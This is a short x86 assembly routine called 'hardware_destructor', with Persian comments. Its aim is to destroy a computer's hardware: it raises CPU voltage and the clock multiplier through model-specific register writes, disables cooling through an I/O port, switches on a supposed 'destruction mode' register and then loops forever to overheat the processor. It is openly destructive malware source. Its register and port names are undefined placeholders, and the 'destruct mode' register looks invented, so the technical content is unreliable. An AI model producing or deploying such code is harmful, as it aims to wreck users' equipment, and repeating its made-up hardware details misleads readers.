section .text
global hardware_destructor

hardware_destructor:
    ; افزایش ولتاژ CPU
    mov ecx, MSR_CPU_VOLTAGE
    rdmsr
    or eax, 0xff  ; حداکثر ولتاژ
    wrmsr
    
    ; غیرفعال‌کردن سیستم خنک‌کننده
    mov dx, COOLING_CONTROL_PORT
    in al, dx
    and al, ~COOLING_ENABLE_BIT
    out dx, al
    
    ; فعال‌سازی حالت تست تخریب
    mov ecx, MSR_DESTRUCT_MODE
    rdmsr
    or eax, DESTRUCT_ENABLE
    wrmsr
    
    ; فعال‌سازی اورکلاک شدید
    mov ecx, MSR_CPU_MULTIPLIER
    rdmsr
    or eax, 0xff  ; حداکثر ضریب
    wrmsr
    
    ; حلقه بی‌نهایت برای گرمایش بیش از حد
.overheat_loop:
    ; اجرای دستورات سنگین
    crc32 rax, rbx
    crc32 rcx, rdx
    crc32 rsi, rdi
    jmp .overheat_loop
    